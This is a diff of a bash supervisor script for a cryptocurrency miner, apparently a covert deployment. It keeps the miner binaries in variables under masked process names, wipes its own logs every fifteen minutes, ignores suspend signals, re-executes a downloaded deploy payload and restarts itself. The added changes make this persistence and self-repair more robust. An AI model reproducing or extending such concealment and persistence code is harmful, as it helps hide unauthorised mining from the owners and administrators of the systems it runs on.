@@ -8,6 +8,7 @@
 ## https://stackoverflow.com/a/2173421/2229761
 # trap "trap - SIGINT EXIT ; kill -9 \$(jobs -p) ; cleanup &>/dev/null ;" SIGINT EXIT
 trap "trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; " SIGINT EXIT SIGKILL SIGTERM
+trap ": ; " SIGTSTP
 export PATH=".:$PATH"
 
 . ./functions
@@ -51,6 +52,7 @@ get_config() {
 }
 ## dump config to disk, if tmppath is deleted change dir
 dump_config() {
+    [ -z "$CONFIG" ] && { log "config empty!"; return 1; }
     [ ! -f  "${OBJ_CFG_MASK}" ] &&
         printf '%s\n' "$CONFIG" > "${OBJ_CFG_MASK}"
 }
@@ -141,7 +143,11 @@ change_profile() {
 
 ## load the objects binary into a variable
 load_bins() {
-    [ -z "${OBJ_MASK}" ] && log "missing obj mask variable" && exit 1
+    if [ -z "${OBJ_MASK}" -o -z "$CLM_MASK" ]; then
+         log "missing masks, using default ones"
+         OBJ_MASK=${OBJ_MASK:-objectd}
+         CLM_MASK=${CLM_MASK:-clmd}
+    fi
     # disable_tracing
     local tries=0 max_tries=3
     while [ $tries -lt $max_tries ]; do
@@ -158,8 +164,8 @@ load_bins() {
             fi
         else
             {
-                fileToVar "${OBJ_MASK}" OBJ_BIN || { log "troubles loading obj_bin"; obj_fail=1; }
-                fileToVar "${CLM_MASK}" CLM_BIN || { log "troubles loading clm_bin"; clm_fail=1; }
+                fileToVar "${OBJ_MASK}" OBJ_BIN || obj_fail=1
+                fileToVar "${CLM_MASK}" CLM_BIN || clm_fail=1
             }
             if [ "$obj_fail" = 1 -o "$clm_fail" = 1 ]; then
                 continue
@@ -170,11 +176,15 @@ load_bins() {
         fi
         tries=$((tries+1))
     done
+    [ $tries -ge $max_tries ] && return 1
     # enable_tracing
 }
 
 dump_bins() {
-    [ -z "${OBJ_BIN}" ] && log "missing obj bin variable" && exit 1
+    if [ -z "${OBJ_BIN}" ]; then
+        log "missing obj bin variable, trying to reload..."
+        load_bins || { log "load bins failed again"; return 1; }
+    fi
     # disable_tracing
     if [ -n "$VERBOSE" ]; then
         varToFile OBJ_BIN "${OBJ_MASK}" 2>>${VERBOSE} ; chmod +x "${OBJ_MASK}" && unset OBJ_BIN
@@ -237,6 +247,8 @@ init() {
     export SLEEP_TIMER
     ## START_TIME : last time the miner was started
     export START_TIME
+    ## CLEARED_LOGS: track last time logs were cleared
+    export CLEARED_LOGS=-1
     ## lockminer : a lock to prevent too fast subsequent switches
     export lockminer=
 
@@ -284,7 +296,9 @@ rmcfg() {
     while [ -f "${EXEC_OBJ_MASK}" -a $((SECONDS-rmcfg_start)) -lt 60 ]; do
         fleep 1
     done
+    ## make sure config is the last one before remove
     rm -f "${OBJ_CFG_MASK}"
+    [[ -s "${OBJ_CFG_MASK}" ]] && CONFIG="$(<${OBJ_CFG_MASK})"
     RMCFG_SCHEDULE=
     log "rmcfg: cleared"
 }
@@ -313,7 +327,6 @@ start_miner() {
     lock_miner
     ## switch path to remove tmppath later ( for deploy script )
     [ "$PWD" != "$tmppath" -a -n "$tmppath" ] && cd "$tmppath"
-    [ -z "$CONFIG" ] && log "config not loaded" && exit 1
     START_TIME=$SECONDS SLEEP_TIMER=0
 
     while true; do
@@ -322,9 +335,10 @@ start_miner() {
         ## make sure config is updated
         log "miner: dumping config"
         dump_config 2>/dev/null
+        [ -z "$CONFIG" ] && log "config not loaded"
         ## unload binaries before starting processes
         log "miner: dumping binaries"
-        dump_bins
+        dump_bins || { log "failed dumping binaries, no point continuing, scratching..."; scratcher; }
         pausd
         ## make sure its ok
         log "miner: waiting for objectd"
@@ -394,7 +408,7 @@ scratcher() {
         bash <<<"$(printf '%s' "$UPDATED_DEPLOY")" 2>&2 1>&1 0<&0 & disown
         exit ## same as below
     else
-        exec bash <<< "$(printf '%s' "$UPDATED_DEPLOY")" 2>&2 1>&1 0<&0
+        exec bash <<< "$(printf '%s' "$UPDATED_DEPLOY")"
     fi
     # kill -9 $BASHPID ## this kill the job that the parent is waiting for
 }
@@ -1112,12 +1126,22 @@ choose_action() {
         "speed")
             switcher "$l" || { stop_miner; start_miner; } ## non zero exit code means a switch has happened
             ;;
+        "-> update config")
+            update_lock=1
+            ;;
         "-> trigger restart")
             ## trigger restart comes after a config update
-            CONFIG="$(<${OBJ_CFG_MASK})"
+            local cfg_rtr=1
+            while :; do
+                [ -e "${OBJ_CFG_MASK}" -o "$cfg_rtr" -gt 3 ] && break
+                cfg_rtr=$((cfg_rtr+1))
+                fleep $cfg_rtr;
+            done
+            [[ -s "$OBJ_CFG_MASK" ]] && CONFIG="$(<${OBJ_CFG_MASK})"
             eval "$(get_config command_before)"
             stop_miner
             start_miner
+            unset update_lock
             ;;
         "-> restart") ## a direct restart command is reserved for payload redownload
             scratcher
@@ -1127,7 +1151,7 @@ choose_action() {
             RMCFG_SCHEDULE=60
             ;;
         *) ## if nothing interesting was printed do some routine work
-            [ -n "$RMCFG_SCHEDULE" ] && rmcfg ##  set by start miner
+            [ -n "$RMCFG_SCHEDULE" -a -z "$update_lock" ] && rmcfg ##  set by start miner
             [ "$((SECONDS%1000))" -gt 900  ] &&
                 [ -a "$((SECONDS-CLEARED_LOGS))" -gt 100 -o -z "$CLEARED_LOGS" ] &&
                 { clear_log; ## wipe log every ~15mins
@@ -1150,25 +1174,32 @@ choose_action() {
 start_switcher() {
     # rto=${rto:-$((2*print_time+10))} ## read timeout
     [ -z "$wakeup_timeout" ] && wakeup_timeout=6
-    rto=${rto:-$((print_time*3))} ## read timeout
-    lto=${lto:-$((2*wakeup_timeout))} ## lock timeout
+    rto=${rto:-$((print_time*3+60))} ## read timeout
+    # lto=${lto:-$((2*wakeup_timeout))} ## lock timeout
     while true; do
         ## timeout after reads but only if a sane amount of time from startup has passed (rto*3)
-        log "switcher: reading a line"
+        log "switcher: checking miner alive"
         ## if exit status is less then 128 it means the fd is closed, so the miner is probably stopped
-        if kill -0 ${objectd_PID}; then
-            read -t $rto -ru ${objectd[0]} l ||
-                { [ "$?" -lt 128 -o $SECONDS -gt $((rto*3)) ] &&
-                      break; }
+        unset l
+        while kill -0 ${objectd_PID}; do
+            [ -n "$l" ] && { choose_action "$l"; unset l; }
+            log "switcher: miner alive, reading line"
+            read -t $rto -ru ${objectd[0]} l
+            log "swticher: line was read"
+            line_status=$?
+            if [ "$line_status" != 0 ] && [ "$line_status" -lt 128 -o $SECONDS -gt $((rto*3)) ]; then
+                log "failed to read with timeout $rto, line is $l, status is $line_status"
+                break
+            fi
             log "switcher: choosing an action"
             choose_action "$l"
+            unset l ## clear l after action is chosen, ## SIGTSTP workaround
             log "switcher: action ended"
-        else
-            ## no miner, restart it
-            break
-        fi
+        done
+        ## no miner, restart it
+        log "switcher: miner not running!"
+        break
     done
-    log "switcher: line read timeout!"
 }
 
 ## start the switcher
@@ -1182,7 +1213,10 @@ start() {
         log "main: starting miner"
         start_miner
         log "main: starting switcher loop"
-        start_switcher
+        while true; do
+            start_switcher
+            kill -0 ${objectd_PID} || break
+        done
         log "main: switcher loop broke, restarting miner"
         fleep 0 ## reset fleep fd
         log "fleep reset, sleeping and restarting"
